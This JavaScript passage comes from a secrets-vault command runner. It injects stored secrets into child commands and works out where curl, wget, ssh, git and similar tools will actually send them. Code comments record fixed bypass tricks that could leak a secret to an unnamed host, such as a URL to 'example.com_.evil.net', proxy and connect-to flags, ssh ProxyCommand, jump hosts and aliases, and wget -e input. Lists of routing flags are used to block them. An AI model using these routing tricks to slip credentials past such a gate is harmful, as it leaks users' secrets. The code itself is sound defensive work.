const knownToolOf = (name) => (name ? findIn(KNOWN_TOOLS, name, (r) => [r.name, ...(r.aka || [])]) : null);
/** → { code, cls, name, words } | null. */
function refusedTool(argv0, { resolved = null } = {}) {
  const name = toolNameOf(argv0, resolved);
  if (!name) return refuse('no_command');
  const row = findIn(REFUSING, name) || REFUSING.find((r) => r.prefix && name.startsWith(r.prefix)) || null;
  return row ? refuse(row.code, { cls: row.cls, tool: name }) : null;
}
/** 'shell' | 'interpreter' | 'tool' — a shell's or an interpreter's whole command line is its program. */
function toolKindOf(name) { const n = String(name || ''); return SHELLS.includes(n) || SHELLS.includes(n.replace(/[\d.]+$/, '')) ? 'shell' : INTERPRETERS.includes(n) || INTERPRETERS.includes(n.replace(/[\d.]+$/, '')) ? 'interpreter' : 'tool'; }

// ── THE PLAN (the request → what the child gets; every refusal by name) ──
const bytesOf = (s) => { let n = 0; for (const ch of String(s)) { const c = ch.codePointAt(0); n += c < 0x80 ? 1 : c < 0x800 ? 2 : c < 0x10000 ? 3 : 4; } return n; };
const pairsOf = (x) => (Array.isArray(x) ? x.map((p) => (Array.isArray(p) ? [String(p[0]), String(p[1] == null ? '' : p[1])] : [String(p && p.name), String(p && p.value != null ? p.value : '')])) : x && typeof x === 'object' ? Object.entries(x).map(([k, v]) => [k, String(v == null ? '' : v)]) : []);
/** The CLI's words → the request. `vibespace-vault run [--env NAME=V]… [--file NAME=vault://…|@template]… [--stdin vault://…]
 *  [--allow-argv] [--on <machine>] [--timeout <s>] [--] <command…>` → { ok, req } | refusal. */
const RUN_FLAGS = Object.freeze(['--env', '--file', '--stdin', '--allow-argv', '--on', '--timeout']);
function timeoutOf(v) { const n = Number(v); return /^\d{1,4}$/.test(String(v)) && n >= 1 && n <= TIMEOUT_MAX_S ? n : null; }
function parseRunArgs(args) {
  const a = (Array.isArray(args) ? args : []).map(String);
  const req = { argv: [], env: [], file: [], stdin: null, allowArgv: false, on: null, timeoutSec: TIMEOUT_DEFAULT_S };
  let i = 0;
  for (; i < a.length; i++) {
    const x = a[i];
    if (x === '--') { i++; break; }
    if (!x.startsWith('--')) break;
    const eq = x.indexOf('='), flag = eq > 0 ? x.slice(0, eq) : x;
    if (!RUN_FLAGS.includes(flag)) return refuse('bad_flag', { flag });
    if (flag === '--allow-argv') { if (eq > 0) return refuse('bad_flag', { flag }); req.allowArgv = true; continue; }
    const v = eq > 0 ? x.slice(eq + 1) : i + 1 < a.length ? a[++i] : null;
    if (v == null) return refuse('bad_flag', { flag });
    if (flag === '--env' || flag === '--file') { const k = v.indexOf('='); if (k < 1) return refuse('bad_flag', { flag }); req[flag.slice(2)].push([v.slice(0, k), v.slice(k + 1)]); }
    else if (flag === '--stdin') { if (req.stdin != null) return refuse('bad_flag', { flag }); req.stdin = v; }
    else if (flag === '--on') req.on = v;
    else { const t = timeoutOf(v); if (t == null) return refuse('bad_flag', { flag }); req.timeoutSec = t; }
  }
  req.argv = a.slice(i);
  return { ok: true, req };
}
/**
 * The request → THE PLAN, or a refusal. `req` = { argv, env, file, stdin, allowArgv, on, resolved, templates } — `env` / `file`
 * as [[NAME, value]] (or { NAME: value }); `resolved` = argv[0] on the agent env's PATH (the door's lookup); `templates` =
 * { <path>: text } for every `--file NAME=@<path>` (the door reads them inside the cwd fence); `timeoutSec` 1–600 (120).
 * → { ok: true, argv, tool, name, kind, row, refs: [ref…], env: [{ name, ref }], plainEnv: [{ name, value }],
 *     files: [{ slot, name|null, ref|null, template|null, text|null }], stdin: ref|null, injection: [..], argvExposed, on, timeoutSec }
 */
function planOf(req = {}) {
  const argv = Array.isArray(req.argv) ? req.argv.map(String) : [];
  if (!argv.length || !argv[0]) return refuse('no_command');
  if (bytesOf(argv.join(' ')) > CMD_MAX) return refuse('cmd_too_long');
  const tr = refusedTool(argv[0]) || (req.resolved ? refusedTool(argv[0], { resolved: req.resolved }) : null);   // lane vault-run-door: the typed name AND the resolved path's
  if (tr) return tr;
  const name = toolNameOf(argv[0], req.resolved), row = knownToolOf(name);
  const refs = new Map(), names = new Set(), env = [], plainEnv = [], files = [], injection = [];
  const add = (r) => { if (!refs.has(r.id)) refs.set(r.id, refOf(r.store, r.entry, r.field)); return refs.get(r.id).ref; };
  const claim = (n, as) => {
    if (!ENV_NAME.test(n)) return refuse('bad_env_name', { name: n });
    if (names.has(n)) return refuse('duplicate_name', { name: n });
    const why = envRefusedOf(n, as);
    if (why) return refuse('env_refused', { name: n, why });
    names.add(n); return null;
  };
  for (const [n, v] of pairsOf(req.env)) {
    const sc = scanRefs(v);
    if (sc.bad.length) return refuse('bad_reference', { text: sc.bad[0].text });
    const r = sc.refs.length ? parseRef(v) : null;
    if (sc.refs.length && !r) return refuse('bad_reference', { text: v.slice(0, 80), why: 'an env value is one whole reference (a template file holds the rest)' });
    const no = claim(n, r ? 'env' : 'plain');
    if (no) return no;
    if (r) { env.push({ name: n, ref: add(r) }); injection.push(`env:${n}`); } else plainEnv.push({ name: n, value: v });
  }
  for (const [n, v] of pairsOf(req.file)) {
    const no = claim(n, 'file');
    if (no) return no;
    if (v.startsWith('@')) {
      const p = v.slice(1), t = req.templates && Object.prototype.hasOwnProperty.call(req.templates, p) ? req.templates[p] : null;
      if (!p) return refuse('bad_flag', { flag: '--file' });
      if (typeof t !== 'string') return refuse('template_unread', { template: p });
      if (bytesOf(t) > TEMPLATE_MAX) return refuse('template_too_long', { template: p });
      const sc = scanRefs(t);
      if (sc.bad.length || sc.refs.some((x) => x.form !== 'brace')) return refuse('bad_reference', { text: (sc.bad[0] || sc.refs.find((x) => x.form !== 'brace')).text || '', why: 'a template names a value as $VAULT{<store>/<row>/<field>}' });
      for (const x of sc.refs) add(x);
      files.push({ slot: files.length, name: n, ref: null, template: p, text: t });
    } else {
      const r = parseRef(v);
      if (!r) return refuse('bad_reference', { text: v.slice(0, 80) });
      files.push({ slot: files.length, name: n, ref: add(r), template: null, text: null });
    }
    injection.push(`file:${n}`);
  }
  let stdin = null;
  if (req.stdin != null) { const r = parseRef(String(req.stdin)); if (!r) return refuse('bad_reference', { text: String(req.stdin).slice(0, 80) }); stdin = add(r); injection.push('stdin'); }
  let argvExposed = false;
  for (const a of argv) {
    const sc = scanRefs(a);
    if (sc.bad.length) return refuse('bad_reference', { text: sc.bad[0].text });
    for (const x of sc.refs) {
      if (x.form === 'file' && x.name) { if (!files.some((f) => f.name === x.name)) return refuse('bad_reference', { text: `$VAULT_FILE{${x.name}}`, why: `no --file ${x.name}=… declares it` }); continue; }
      if (x.form === 'file') { const ref = add(x); if (!files.some((f) => f.name === null && f.ref === ref)) { files.push({ slot: files.length, name: null, ref, template: null, text: null }); injection.push('file:$VAULT_FILE'); } continue; }
      const iv = injectionOf('argv', { allowArgv: !!req.allowArgv, row });
      if (!iv.ok) return { ...iv, tool: name };
      add(x); argvExposed = true;
    }
  }
  if (argvExposed) injection.push('argv');
  if (!refs.size) return refuse('no_reference');
  return { ok: true, argv, tool: String(req.resolved || argv[0]), name, kind: toolKindOf(name), row, refs: [...refs.values()], env, plainEnv, files, stdin, injection: [...new Set(injection)], argvExposed, on: req.on ? String(req.on) : null, timeoutSec: timeoutOf(req.timeoutSec) || TIMEOUT_DEFAULT_S, programWritable: req.programWritable === true };
}
/** The door's LAST step over planOf's answer (`run`) — the only object that holds values (never stored, never logged): the
 *  child's argv / env / stdin and each file's content. `valueOf(ref)` = the vault's value; `pathOf(slot)` = the door's 0700 run dir + a name. */
function materialize(run, { valueOf, pathOf }) {
  const slotOf = (x) => (run.files.find((f) => (x.name ? f.name === x.name : f.name === null && f.ref === x.ref)) || {}).slot;
  const argv = run.argv.map((a) => {
    const { refs } = scanRefs(a);
    let out = '', i = 0;
    for (const x of refs) { out += a.slice(i, x.at) + (x.form === 'file' ? String(pathOf(slotOf(x))) : run.argvExposed ? String(valueOf(x.ref)) : x.ref); i = x.at + x.len; }
    return out + a.slice(i);
  });
  const env = {};
  for (const e of run.plainEnv) env[e.name] = e.value;
  for (const e of run.env) env[e.name] = String(valueOf(e.ref));
  for (const f of run.files) if (f.name) env[f.name] = String(pathOf(f.slot));
  const files = run.files.map((f) => ({ slot: f.slot, path: String(pathOf(f.slot)), content: f.template != null ? renderTemplate(f.text, valueOf) : String(valueOf(f.ref)) }));
  return { argv, env, files, stdin: run.stdin ? String(valueOf(run.stdin)) + '\n' : null };
}

// ── THE SHAPE KEY (decision ④) ──
// lane vault-use-grants round 3 (BLOCKER): a URL's host is what the WHATWG URL parser (`new URL`) says — NOT a character
// class. The old `[A-Za-z0-9.-]+` stopped at `_` `~` `|` and non-ASCII, so `https://example.com_.evil.net/` read as
// example.com and a grant for example.com admitted it (the real curl sent Host: example.com_.evil.net). THE SEAM: this is
// vault-agent-own r19's `urlParse` — at train-C import it; do not keep a second reader. URL_FIND_RE only LOCATES a token.
const URL_FIND_RE = /\b([a-z][a-z0-9+.-]{0,31}):\/\/\S+/gi;   // scheme://… up to whitespace; the host is read by urlParse
const URL_TRAIL = /[)\]>.,;'"]+$/;   // trailing punctuation the locator swept up
const normHost = (h, port = null) => { const x = String(h || '').toLowerCase().replace(/^\[|\]$/g, '').replace(/\.$/, ''); return x && x.length <= 253 && !/[{}]/.test(x) && !x.split('.').some((l) => l.length > 63) ? (port ? `${x}:${port}` : x) : null; };   // a name > 253 or a label > 63 is not valid DNS; a `{{var}}` is never a host (fail closed)
// lane vault-use-grants round 4 (BLOCKER): WHATWG «special schemes» treat `\` as `/`, so `new URL()` ends the authority
// at a backslash — but curl / wget keep `host\` as USERINFO and connect to the host after the `@`. The reader must never try
// to out-parse the tool: for a special scheme it reads a host ONLY from a CLEAN authority (a bare host[:port]); a `\`, a
// userinfo `@`, a `%`-escape, whitespace or a non-ASCII byte in the authority makes curl route where new URL() does not —
// the token is OPAQUE (the card, no «Always»). The seam: vault-agent-own r23's urlParse gets the SAME rule (its r24 addendum).
const SPECIAL_SCHEME = /^(?:https?|ftp|ftps|ws|wss|gopher):$/i;
/** A scheme://… token → { host, port?, userinfo } | { bad } (unparseable) | { opaque } (parses, but the tool may route
 *  elsewhere than new URL() reads — a special-scheme authority that is not a clean host). (Seam: vault-agent-own r23 urlParse.) */
function urlParse(token) {
  const t = String(token);
  let u; try { u = new URL(t); } catch { return { bad: true }; }
  if (SPECIAL_SCHEME.test(u.protocol)) {
    const m = /^[a-z][a-z0-9+.-]{0,31}:\/\/([^/?#]*)/i.exec(t);   // the RAW authority — up to the first ASCII `/`, `?` or `#` (NOT `\`)
    const rawAuth = m ? m[1] : '';
    if (/[\\@%]/.test(rawAuth) || /[^\x21-\x7e]/.test(rawAuth)) return { opaque: true };   // `\` / userinfo `@` / `%`-escape / space / non-ASCII ⇒ new URL() and curl disagree ⇒ fail closed
  }
  const h = normHost(u.hostname, u.port || null);
  if (!h) return { bad: true };
  return { host: h, userinfo: !!(u.username || u.password) };
}
function urlHosts(text) {
  const out = []; let m; URL_FIND_RE.lastIndex = 0;
  while ((m = URL_FIND_RE.exec(String(text)))) { if (m[1].toLowerCase() === 'vault') continue; const r = urlParse(m[0].replace(URL_TRAIL, '')); if (r.host) out.push(r.host); }
  return out;
}
/** Does any scheme://… token in `text` parse to an OPAQUE destination (a special-scheme authority the reader cannot be
 *  certain the tool routes to — the backslash/userinfo family)? (lane vault-use-grants round 4, BLOCKER.) */
function urlOpaque(text) {
  let m; URL_FIND_RE.lastIndex = 0;
  while ((m = URL_FIND_RE.exec(String(text)))) { if (m[1].toLowerCase() === 'vault') continue; if (urlParse(m[0].replace(URL_TRAIL, '')).opaque) return true; }
  return false;
}
const HOSTNAME = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$|^localhost$/i;

// ── THE RUN'S DESTINATIONS (lane vault-use-grants round 2 BLOCKER, round 3 completes it) — THE SEAM ──
// `shape.hosts` is what the card NAMES (every URL / host-flag / scp target / default). Where the value actually GOES is a
// wider question: curl's routing flags (-x/--proxy/--proxy1.0/--connect-to/--resolve/--socks*), ssh's -o ProxyCommand /
// LocalCommand / -J / -W, git's -c, rsync's -e, wget's -e http_proxy=, a bare positional (curl localhost:9999/x), a numeric
// address (2130706433), a unix socket, an ssh config alias, and a proxy env var all send it to a host that never enters
// `shape.hosts`. `routeTargetsOf` reads those too (the SAME reader a card and a grant share); it returns `opaque:true` when a
// routing input cannot be resolved to a concrete host (ProxyCommand, a unix socket, a non-dotted-quad numeric address, a
// proxy env var, a config alias) — the door then asks (fail closed). Attached short values (`-xHOST`, `-oProxyCommand=…`)
// are read by shapeOf's getopt (`shortSplit`), so they reach `keyed` here.
// INTEGRATION SEAM: vault-agent-own r19 builds a LOCAL `const routeHosts = new Set()` inside its shapeOf and emits a
// `shape.routeHosts` field (gh's routing inputs). This lane emits the SAME field `shape.routeHosts` + `routeOpaque`, but its
// builder is a MODULE function — named `routeTargetsOf` (round 3 MINOR) so the merge cannot silently keep r19's local Set in
// place of this reader. At train-C the two fold into ONE `shape.routeHosts`/`routeOpaque`; `destinationsOf` reads the field.
// See docs/kb-bugfix-invariants.md «### Round 3 — As-built integration note».
const SSH_LOCAL_O = new Set(['proxycommand', 'localcommand', 'knownhostscommand', 'permitlocalcommand', 'match']);   // ssh -o keys that run a LOCAL command / redirect — where it goes cannot be told (fail closed)
// lane vault-use-grants round 6 (BLOCKER item 1): the `-o` keys whose VALUE is a host the ssh family resolves through
// ~/.ssh/config (from `ssh -G`'s keywords) — subject to the alias law, read by the ONE reader `addSshHost`. `-J` and `-W`
// are short spellings of the same destination family (`ssh -G -J router` prints `proxyjump router`, identical to
// `-o ProxyJump=router`). A missed spelling is a missing ROW here (or a short flag routed to addSshHost), never a branch
// that forgot the alias check — so a single-label jump host can no longer slip past with `always:true`.
const SSH_HOST_OPTS = new Set(['proxyjump', 'hostname']);
// lane vault-use-grants round 4 (MINOR item 6): wget `-e CMD` runs ONE .wgetrc command. Only a REVIEWED, pinned set of
// NON-routing / non-credential / non-file-redirect commands is safe to let a grant stand for; every other command (input,
// *_proxy, use_proxy, post_file, load_cookies, base, certificate, private_key, header, referer, user, password, ask_password,
// use_askpass, span_hosts, …) adds a destination or carries a credential the card never named ⇒ OPAQUE.
const WGET_SAFE_E = new Set(['robots', 'timestamping', 'quiet', 'verbose', 'server_response', 'tries', 'timeout', 'dns_timeout', 'connect_timeout', 'read_timeout', 'wait', 'waitretry', 'random_wait', 'retry_connrefused', 'progress', 'show_progress', 'check_certificate', 'content_disposition', 'adjust_extension', 'continue', 'no_clobber']);
/** An authority (no scheme) → { host, port } (userinfo dropped at the LAST `@`, IPv6 brackets handled). */
function splitAuthority(a) {
  let s = String(a == null ? '' : a).trim();
  const at = s.lastIndexOf('@'); if (at >= 0) s = s.slice(at + 1);
  if (s[0] === '[') { const j = s.indexOf(']'); if (j > 0) { const m = /^:(\d{1,5})$/.exec(s.slice(j + 1)); return { host: s.slice(1, j), port: m ? m[1] : null }; } }
  const p = s.split(':');
  if (p.length === 2 && /^\d{1,5}$/.test(p[1])) return { host: p[0], port: p[1] };
  return { host: p.length > 2 ? s : p[0], port: null };   // > 2 colons = a bare IPv6 literal
}
const schemeOff = (s) => String(s == null ? '' : s).replace(/^[a-z][a-z0-9+.-]{0,31}:\/\//i, '');
// lane vault-use-grants round 5 (MAJOR item 5): the scheme words curl 8.18 treats as a URL (its Protocols line). A positional
// whose prefix is one of these and is NOT spelled `scheme://host` — `ftp:/127.0.0.1:P/x` (one slash) or `ftp:HOST` (none) —
// is read by curl as a URL to the host after it, while the BARE reader would name the SCHEME WORD as the host; it is BLIND.
const CURL_SCHEMES = new Set(['dict', 'file', 'ftp', 'ftps', 'gopher', 'gophers', 'http', 'https', 'imap', 'imaps', 'ipfs', 'ipns', 'ldap', 'ldaps', 'mqtt', 'pop3', 'pop3s', 'rtmp', 'rtmpe', 'rtmps', 'rtmpt', 'rtmpte', 'rtmpts', 'rtsp', 'scp', 'sftp', 'smb', 'smbs', 'smtp', 'smtps', 'telnet', 'tftp', 'ws', 'wss']);
// lane vault-use-grants round 5 (BLOCKER item 1): the ssh family (ssh / scp / sftp / rsync / git-over-ssh) resolves a
// single-label host through ~/.ssh/config (`ssh -G ssh://router` prints the alias' HostName, exactly as the bare form) in
// EVERY spelling — bare `host`, `user@host`, `host:path`, `ssh://`, `scp://`, `sftp://`, `git+ssh://`, `-o HostName=`, `-F`.
// A host that is not a dotted name / an address / localhost is an ALIAS the agent can redefine ⇒ OPAQUE (the card, no «always»).
const SSH_SCHEME = /^(?:ssh|sftp|scp|git\+ssh|ssh\+git|svn\+ssh)$/i;
const sshAlias = (h) => { const x = String(h || '').toLowerCase().replace(/^\[|\]$/g, '').replace(/\.$/, ''); return !!x && x !== 'localhost' && !/[.:]/.test(x); };   // round 6 item 2: a single label (no dot = not a dotted name, no colon = not a bare IPv6), not localhost — a ONE-LETTER host is an alias too (a drive letter is a LOCAL `X:path`, read only in the scpLike branch below, NEVER a host)
/** The host of an ssh-family target positional, in EVERY spelling (scheme URI → new URL; `host:path` → before the first `:`;
 *  bare `[user@]host`), or null if the positional is not a target (a local path, a refspec). */
function sshTargetHost(p, row) {
  const s = String(p);
  const sm = /^([a-z][a-z0-9+.-]*):\/\//i.exec(s);
  if (sm) { if (!SSH_SCHEME.test(sm[1])) return null; try { return new URL(s).hostname || null; } catch { return null; } }   // only SSH-transport schemes resolve through ~/.ssh/config — http(s)/git:// do not
  if (row.scpLike) { const m = /^(?:[\w.+-]+@)?(\[[0-9a-f:.]+\]|[A-Za-z0-9.-]{1,253}):(?!\/\/)/i.exec(s); if (m) return /^[A-Za-z]$/.test(m[1]) ? null : m[1]; }   // round 6 item 2: a single-letter `X:path` is a LOCAL drive (`C:\x`), never a host — the drive-letter exemption lives HERE, not in sshAlias
  if (row.sshTarget) { const m = /^(?:[\w.+-]+@)?([A-Za-z0-9.-]{1,253})$/.exec(s); if (m) return m[1]; }
  return null;
}
/** A proxy / preproxy / socks value → its authority as the ONE parser reads it: scheme stripped, cut at the first `/`, `?` or
 *  `#` (a `#@host` / `?@host` tail is a fragment/query the tool drops, NEVER userinfo), then host[:port]. (round 5 item 5.) */
const proxyAuthority = (val) => splitAuthority(schemeOff(String(val == null ? '' : val).trim()).split(/[\/?#]/)[0]);
const BARE_RE = /^(?:[^\s@\/\\?#]*@)?(\[[0-9a-f:.]+\]|[A-Za-z0-9](?:[A-Za-z0-9.-]{0,251}[A-Za-z0-9])?)?(?::(\d{0,5}))?(?:[\/?#]\S*)?$/i;
/** A URL tool's bare positional → { host } | { unread:true } (a glob {a,b}/[1-9], or a NUMERIC address not in dotted-quad
 *  form — 2130706433 / 0x7f000001 / 127.1 — which the shape cannot list, so it is blind) | {} (not a target). */
function targetOf(a) {
  const s = String(a);
  if (/[{}]|\[(?![0-9a-f:.]+\])/i.test(s)) return { unread: true };   // curl glob
  if (/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(s)) return urlHosts(s).length ? {} : { unread: true };   // scheme://… → the ONE parser
  const sch = /^([a-z][a-z0-9+.-]*):/i.exec(s);
  if (sch && CURL_SCHEMES.has(sch[1].toLowerCase())) return { unread: true };   // round 5 item 5: a scheme the tool knows, NOT a clean scheme://host (`ftp:/HOST`, `ftp:HOST`) — curl connects where the bare reader names the SCHEME WORD; BLIND
  const m = BARE_RE.exec(s);
  if (!m || (!m[1] && m[2] == null)) return { unread: true };
  if (!m[1]) return { host: normHost('localhost', m[2] || null) };   // `:3000` = localhost:3000
  if (/^[\d.]+$/.test(m[1]) && !/^\d{1,3}(?:\.\d{1,3}){3}$/.test(m[1])) return { unread: true };   // a numeric address not dotted-quad ⇒ blind (fail closed)
  return { host: normHost(m[1], m[2] || null) };
}
const httpieTarget = (ps) => (ps.length >= 2 && /^[A-Za-z]+$/.test(ps[0]) ? ps.slice(1, 2) : ps.slice(0, 1));   // `http [METHOD] URL` — the URL, never the method
/** The hosts the run will CONTACT: `shape.hosts` + every routing/proxy/bare target; `opaque` when one cannot be resolved. */
function routeTargetsOf(row, kind, hosts, keyed, positionals, plainEnv) {
  const out = new Set(hosts), add = (h, port = null) => { const n = normHost(h, port); if (n) out.add(n); };
  let opaque = false;
  // round 6 (BLOCKER item 1): the ONE reader every host-bearing ssh option goes through — it adds the destination AND
  // applies the alias law, so a jump host (`-J`), a `-W host`, an `-o ProxyJump=`/`-o HostName=` all fail closed on an alias.
  const addSshHost = (h) => { const a = splitAuthority(String(h).trim()); if (a.host) { add(a.host, a.port); if (sshAlias(a.host)) opaque = true; } };
  if (!(row && kind === 'tool')) { for (const h of hosts) out.add(h); return { hosts: [...out].filter(Boolean), opaque }; }
  if (row.proxyEnv) for (const e of plainEnv || []) if (/^(?:https?|all|ftp)_proxy$/i.test(e.name) && String(e.value || '').trim()) opaque = true;   // a proxy env var intercepts every request — where it goes cannot be told
  for (const kv of keyed || []) {
    const i = kv.indexOf('='); const flag = kv.slice(0, i), val = kv.slice(i + 1);
    if (flag === '-x' || flag === '--proxy' || flag === '--preproxy' || flag === '--proxy1.0' || /^--socks[45]/.test(flag)) { const a = proxyAuthority(val); if (a.host) add(a.host, a.port); else if (val.trim()) opaque = true; }   // round 5 item 5: the authority is cut at the first / ? # — `host:port#@other` connects to host:port, not other
    else if (flag === '--connect-to') { const f = val.split(':'); if (f[2]) add(f[2], /^\d{1,5}$/.test(f[3] || '') ? f[3] : null); else if (val.trim()) opaque = true; }   // HOST1:PORT1:HOST2:PORT2 → connects to HOST2
    else if (flag === '--resolve') { const m = /^\+?[^:]+:\d+:(.+)$/.exec(val); if (m) for (const addr of m[1].split(',')) { const a = splitAuthority(addr.trim()); if (a.host) add(a.host); } }   // HOST:PORT:ADDR[,ADDR] → routes to ADDR
    else if (flag === '--doh-url') { const hs = urlHosts(val); if (hs.length) hs.forEach((h) => out.add(h)); else if (val.trim()) opaque = true; }
    else if (flag === '--unix-socket' || flag === '--abstract-unix-socket' || flag === '--dns-servers' || flag === '--alt-svc') { if (val.trim() || flag.includes('unix')) opaque = true; }   // a local socket / an attacker-chosen resolver / an alt route — a destination the grant can never name
    else if (flag === '-e' || flag === '--execute' || flag === '--rsh') { if (row.name === 'rsync') opaque = true; else if (!WGET_SAFE_E.has(String(val).split('=')[0].trim().toLowerCase())) opaque = true; }   // rsync -e <remote shell>; wget -e <.wgetrc cmd> opaque unless a reviewed non-routing command (round 4: -e input=FILE leaked)
    else if (flag === '-o') { const e = val.indexOf('='), ve = val.indexOf(' '), c = e < 0 ? ve : ve < 0 ? e : Math.min(e, ve); const k = (c < 0 ? val : val.slice(0, c)).trim().toLowerCase(), rest = c < 0 ? '' : val.slice(c + 1).trim(); if (SSH_LOCAL_O.has(k)) opaque = true; else if (SSH_HOST_OPTS.has(k)) for (const h of rest.split(/[,\s]+/)) addSshHost(h); }   // ssh -o; round 5/6: an `-o HostName=`/`-o ProxyJump=` carrying a single-label alias is subject to the alias law via addSshHost (`-F <config>` stays `config-file` — it withholds «always»; a remap of a dotted host through a config is the acknowledged ~/.ssh/config gap, open on both trees)
    else if (flag === '-J') { for (const h of val.split(',')) addSshHost(h); }   // round 6 item 1: a jump host is `-o ProxyJump=` by another spelling — the SAME alias law (addSshHost)
    else if (flag === '-W') { addSshHost(val); }   // ssh -W host:port — the forwarded destination, under the alias law too
    else if (flag === '-c' || flag === '--config-env' || flag === '-D' || flag === '-S' || flag === '-L' || flag === '-R') opaque = true;   // git config / a forward can redirect where it goes
  }
  if (/^(?:curl|wget)$/.test(row.name)) for (const p of positionals) { const t = targetOf(p); if (t.host) add(t.host); else if (t.unread) opaque = true; }   // every bare positional is a destination; a glob / numeric address is blind
  else if (/^(?:http|https|httpie)$/.test(row.name)) for (const p of httpieTarget(positionals)) { const t = targetOf(p); if (t.host) add(t.host); else if (t.unread) opaque = true; }
  // lane vault-use-grants round 5 (BLOCKER item 1): the ssh family's TARGET host is subject to the alias law in EVERY
  // spelling (`sshTargetHost` reads it from a bare `[user@]host`, a `host:path`, or an `ssh://`/`scp://`/`sftp://`/`git+ssh://`
  // URI — r4's rule wrongly exempted every `://` target, reopening `ssh ssh://router`). git: only the REMOTE (positionals[0]);
  // the rest are refspecs. A git https URL is NOT ssh (sshTargetHost returns null for it) — its host is read by urlParse.
  if (row.sshTarget && positionals.length) { const h = sshTargetHost(positionals[0], row); if (h && sshAlias(h)) opaque = true; }
  if (row.scpLike) for (const p of (row.name === 'git' ? positionals.slice(0, 1) : positionals)) { const h = sshTargetHost(p, row); if (h && sshAlias(h)) opaque = true; }
  return { hosts: [...out].filter(Boolean), opaque };
}
/** THE reader the card and the grant share: { hosts, opaque } — the hosts the run will CONTACT. (The seam above.) */
const destinationsOf = (shape) => ({ hosts: Array.isArray(shape.routeHosts) ? shape.routeHosts : (shape.hosts || []), opaque: !!shape.routeOpaque });

function argClassOf(a) {
  if (/\$VAULT_FILE\{/.test(a)) return '<vaultfile>';
  if (/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(a)) return '<url>';
  if (/^[+-]?\d+(?:\.\d+)?$/.test(a)) return '<number>';
  if (/[\/\\]|^[.~]/.test(a)) return '<path>';
  return '<word>';
}
/** getopt's short-flag cluster: the first letter that takes a value takes the rest of the word (`-xHOST`, `-sxHOST`,
 *  `-oProxyCommand=…`) or the next word (lane vault-use-grants round 3, BLOCKER — an attached value never dodged routeTargetsOf). */
function shortSplit(a, takes) { for (let i = 1; i < a.length; i++) { const f = '-' + a[i]; if (takes.includes(f)) { let v = i + 1 < a.length ? a.slice(i + 1) : null; if (v && v[0] === '=') v = v.slice(1); return { f, head: a.slice(0, i + 1), v }; } } return null; }
/** planOf's answer (`run`) → its SHAPE: { v, tool, name, kind, sub, flags, args, hosts, entries, injection, env (NAME=value), keyed,
 *  templates, on, script, known, proxyEnv, always, noAlways, argvExposed }. `always` = «always» may be offered for it. */
function shapeOf(run) {
  const row = run.row, kind = run.kind, argv = run.argv;
  const flags = new Set(), sub = [], args = [], positionals = [], keyed = [];
  let script = null, afterDashes = false, valueNext = null, configFile = false;
  const isKeyed = (f) => !!(row && (row.keyed || []).includes(f));
  const takes = row ? [...(row.valueFlags || []), ...(row.hostFlags || []), ...(row.configFlags || []), ...(row.keyed || [])] : [];   // every flag that consumes a value — so an attached short value (`-xHOST`) is read, and a value flag's value (`-o out.json`) is never a positional host (round 3, item 4)
  if (kind !== 'tool') script = JSON.stringify(argv.slice(1));
  else for (const a of argv.slice(1)) {
    if (!afterDashes && a === '--') { afterDashes = true; flags.add('--'); continue; }
    if (!afterDashes && a.length > 1 && a[0] === '-') {
      const eq = a.startsWith('--') ? a.indexOf('=') : -1;
      const cl = a[1] !== '-' && a.length > 2 && !takes.includes(a) ? shortSplit(a, takes) : null;   // -xHOST / -sxHOST / -oProxyCommand=…
      const f = eq > 0 ? a.slice(0, eq) : cl ? cl.f : a;
      const v = eq > 0 ? a.slice(eq + 1) : cl ? cl.v : null;
      if (row && (row.configFlags || []).includes(f)) configFile = true;
      if (v != null) { flags.add(eq > 0 ? a.slice(0, eq + 1) : cl.head); if (isKeyed(f)) keyed.push(`${f}=${v}`); else args.push(argClassOf(v)); } else flags.add(cl ? cl.head : a);
      valueNext = v == null && (takes.includes(a) || takes.includes(f) || cl) ? f : null;
      continue;
    }
    const wasValue = valueNext; valueNext = null;
    if (wasValue && isKeyed(wasValue)) { keyed.push(`${wasValue}=${a}`); continue; }   // a routing flag's value IS the shape (ssh -o ProxyCommand=…)
    if (wasValue) { args.push(argClassOf(a)); continue; }   // a value flag's value is NOT a positional (round 3, item 4)
    if (row && row.sub && sub.length < row.sub && !positionals.length && /^[a-z][a-z0-9-]{0,40}$/.test(a)) { sub.push(a); continue; }
    args.push(argClassOf(a));
    positionals.push(a);
  }
  // THE HOSTS: every URL anywhere (the command, the plain env values, the templates) + the row's own rules; its defaults when none
  const hosts = new Set([...argv.slice(1), ...run.plainEnv.map((e) => e.value), ...run.files.map((f) => f.text || '')].flatMap(urlHosts));
  if (row && kind === 'tool') {
    const all = argv.slice(1);
    if (row.scpLike) for (const a of (row.name === 'git' ? positionals.slice(0, 1) : positionals)) { const m = /^(?:[\w.+-]+@)?([A-Za-z0-9.-]{2,253}):(?!\/\/)/.exec(a); if (m && !/^[A-Za-z]$/.test(m[1])) hosts.add(normHost(m[1])); }   // git: only the REMOTE (a refspec HEAD:main is never a host)
    if (row.sshTarget && positionals.length) { const m = /^(?:[\w.+-]+@)?([A-Za-z0-9.-]{1,253})$/.exec(positionals[0]); if (m) hosts.add(normHost(m[1])); }
    if (row.hostFlags) all.forEach((a, i) => { const eq = a.indexOf('='); if (row.hostFlags.includes(a) && all[i + 1]) hosts.add(normHost(all[i + 1])); else if (eq > 0 && row.hostFlags.includes(a.slice(0, eq))) hosts.add(normHost(a.slice(eq + 1))); });
    if (row.registry) for (const a of positionals) { const h = a.split('/')[0]; if (HOSTNAME.test(h.replace(/:\d+$/, ''))) hosts.add(normHost(h)); }
    if (row.hostEnv) for (const e of run.plainEnv) if ([].concat(row.hostEnv).includes(e.name) && e.value) hosts.add(normHost(e.value));
    if (!hosts.size && row.hosts) row.hosts.forEach((h) => hosts.add(h));
  }
  hosts.delete(null);
  const known = !!row && kind === 'tool';
  // lane vault-use-grants round 2 (BLOCKER): the DESTINATIONS the run contacts (routing flags, proxies, bare positionals) —
  // a superset of `hosts`; `routeOpaque` when a routing input cannot be resolved (ProxyCommand, a proxy env var) ⇒ no «always».
  const dest = routeTargetsOf(row, kind, [...hosts], keyed, positionals, run.plainEnv);
  if (known && argv.slice(1).some((a) => urlOpaque(a))) dest.opaque = true;   // round 4 (BLOCKER): a URL token in the command whose host the reader cannot be certain of (the backslash/userinfo family) ⇒ opaque
